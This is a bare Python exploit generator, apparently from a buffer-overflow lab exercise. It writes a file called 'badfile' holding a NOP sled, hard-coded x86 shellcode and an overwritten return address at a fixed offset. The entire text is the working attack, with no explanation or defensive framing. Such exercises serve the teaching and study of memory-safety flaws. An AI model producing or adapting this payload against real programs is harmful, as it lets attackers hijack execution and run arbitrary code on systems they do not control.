#!/usr/bin/python3


shellcode= (
   "\x31\xc0\x31\xc9\xb0\x01\xb1\x06\x51\x50\xbb\x86\x62\x55\x56\xff"
   "\xd3\x31\xc9\x51\x50\xff\xd3\xb1\x05\x51\x50\xff\xd3\x31\xc9\x51"
   "\x50\xff\xd3\x31\xc9\x51\x50\xff\xd3\xb1\x01\x51\x50\xff\xd3"
).encode('latin-1')


content = bytearray(0x90 for i in range(1828))

start = 1828 - len(shellcode)

content[start: start+len(shellcode)] = shellcode

ret = 0xffffc9f8 + 0x482
offset = 933
L = 4

content[offset: offset+L] = (ret).to_bytes(L, byteorder='little')

with open("badfile", "wb") as file:
	file.write(content) 
